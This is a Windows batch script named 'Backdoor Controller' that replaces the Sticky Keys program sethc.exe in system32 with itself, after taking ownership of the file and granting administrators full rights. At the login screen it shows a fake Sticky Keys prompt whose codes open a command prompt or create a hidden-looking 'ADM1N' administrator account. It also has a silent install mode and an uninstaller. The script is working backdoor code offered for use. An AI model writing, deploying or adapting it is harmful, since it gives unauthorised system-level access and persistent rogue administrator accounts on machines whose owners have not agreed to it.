@echo off
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:: Set the Backdoor Controller Name:
set "name=Backdoor Controller"
:: Set the version number
set "version=3.0.7"
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
    if "%~1"=="211" goto Backdoor.Check
    set "pars=%~1"
    set "looped=no"
    set "case=if /i "%pars%"==""
    :Backdoor.Parameters
            
            %case%test" goto :Backdoor.Query
            %case%test1" goto :Backdoor.Show
            %case%install" set "silent=0"&goto :Backdoor.Install
            %case%silent.install" set "silent=1"&goto :Backdoor.Install
            %case%uninstall" goto :Backdoor.Uninstall
            %case%check" goto :Backdoor.Verify
            %case%ADM1N" goto :ADM1N
            %case%admin" goto :ADM1N
            %case%help" goto :help
            
        if "%looped%"=="yes" (goto :end) else (
            set "looped=yes"
            set "case=if /i "%pars%"=="/"
            goto :Backdoor.Parameters
        )
:Backdoor.Check
    net file>nul 2>&1||goto :Backdoor.Hide
    :Backdoor.Query
    %extd% /messagebox "Sticky Keys" "Do you want to turn on Sticky Keys?" 36
    if "%result%"=="6" goto :Backdoor.Show
    goto :end
    :Backdoor.Show
        set "result="
        %extd% /inputbox "Sticky Keys" "Use the below box to enter the threshold for Sticky Keys"
        set "if=if /i "%result%"=="
        %if%   "uninstall"   goto :Backdoor.Uninstall
        %if%   "cmd"         pushd C:\Windows\SYSTEM32&goto :CMD
        %if%   "admin"       goto :adm1n
        %if%   "adm1n"       goto :adm1n
        %if%   "help"        goto :help
        goto :end

:Backdoor.Uninstall
    cmd /c start "Uninstaller" cmd /c "echo Uninstalling 'sethc.exe' backdoor...&timeout -t 5&del /F "C:\Windows\system32\sethc.exe"&ren C:\Windows\system32\sethc2.exe sethc.exe&color f0&echo Finished&echo Exiting...&timeout -t 5"
    goto :end
:CMD
    call start "Backdoor Command Prompt" cmd
    goto :end
:Backdoor.Hide
    if exist "C:\windows\system32\sethc2.exe" start C:\windows\system32\sethc2.exe 211
    goto end
:Backdoor.Verify
    %extd% /messagebox "Backdoor status" "'sethc.exe'  backdoor is installed (version %version%)" 48
    goto :end
:Backdoor.Install
    title %name% (%version%) Installer
    set "NEWsethc=%~0"
    mode con: cols=80 lines=450
    %extd% /showself
    prompt $S
    set "line=@echo.&echo.&echo �������������������������������������������������������������������������������"
    cls
    color f0
    echo �������������������������������������������������������������������������������
    if not "%silent%"=="1" (echo �� Press any key to install %name% ^(%version%^))
    if not "%silent%"=="1" (pause >nul)
    @echo on
    @echo �� Checking if backup is required...
    if not exist "C:\windows\system32\sethc2.exe" copy C:\windows\system32\sethc.exe C:\windows\system32\sethc2.exe
    %line%
    @echo �� Killing SETHC.exe (To prevent backdoor lockout)
    taskkill /f /im sethc.exe
    %line%
    @echo �� Taking ownership of SETHC.exe
    takeown /f "C:\windows\system32\sethc.exe" 
    icacls "C:\windows\system32\sethc.exe" /grant administrators:F
    %line%
    @echo �� Deleting current SETHC.exe
    del C:\windows\system32\sethc.exe
    %line%
    @echo �� Copying backdoor...
    copy "%NEWsethc%" C:\windows\system32\sethc.exe
    @echo off
    if "%silent%"=="1" (((echo N|comp "%NEWsethc%" C:\windows\system32\sethc.exe)|findstr "OK")>nul 2>&1&&goto :end||goto :Install.Bad)
    ((echo N|comp "%NEWsethc%" C:\windows\system32\sethc.exe)|findstr "OK")>nul 2>&1&&call :Install.Success||call :Install.Failed
    %line%
    :Recover
    echo �� Press the space bar to launch a CMD console, or click 'X' to exit
:Loop
    pause >nul
    start cmd
    echo �� Press The Space Bar To Launch A CMD Console, Or Press 'X' To Exit
    goto :Loop
:Install.Bad
    echo � � �� �� ��    FAILED!!!    �� �� �� � �
    goto :Recover
:Install.Success
    %extd% /messagebox "Installation successful!" "The installation of the 'sethc.exe' backdoor was successful" 64
    goto :EOF
:Install.Failed
    %extd% /messagebox "Installation failed!" "The installation of the 'sethc.exe' backdoor failed, see above for more details" 16
    goto :EOF
:Adm1n
    (net user|findstr "ADM1N")>nul&&goto :Adm1n.Disable||goto :Adm1n.Enable
        :Adm1n.Disable
            (net user ADM1N /delete)&&%extd% /messagebox "Success" "Successfully removed 'ADM1N' account" 64||%extd% /messagebox "Error" "Failed to remove ADM1N account (Try signing out first)" 16
            goto :end
        :Adm1n.Enable
            (net user ADM1N /add)||goto :Adm1n.Enable.Failed
            (net localgroup administrators ADM1N /ADD)||goto :Adm1n.Enable.Failed
            %extd% /messagebox "Success" "Successfully installed 'ADM1N' account" 64
            goto :end
        :Adm1n.Enable.Failed
            %extd% /messagebox "Error" "Failed to create ADM1N account" 16
            goto :end
            
:help
cls
mode con: cols=73 lines=28
color 0f
%extd% /showself
echo.^
�������������������������������������������������������������������������^
�                       BACKDOOR CONTROLLER HELP                        �^
�������������������������������������������������������������������������
echo.
echo.
echo.COMMAND LINE PARAMETERS:
echo.
echo.   /install          = Run the automated installer
echo.   /silent.install   = Run the automated installer, without user input
echo.   /uninstall        = Run the automated uninstaller, without user input
echo.   /check            = Shows a popup message with the installed version
echo.   /test             = Bypass the admin check, and display screen 0
echo.   /test1            = Bypass the admin check, and display screen 1
echo.   /admin            = Installs or uninstalls the ADM1N account
echo.   help              = Displays this screen
echo.   211               = Launches the program normally
echo.  
echo.        NOTE:  If no param is passed, then nothing happens
echo.
echo.        
echo.COMMAND CODES:
echo.
echo.   uninstall      = Run the automated uninstaller, without user input
echo.   cmd            = Opens a command prompt
echo.   admin          = Installs or uninstalls the ADM1N account
echo.   help           = Displays this screen
pause >nul
:end
    exit /b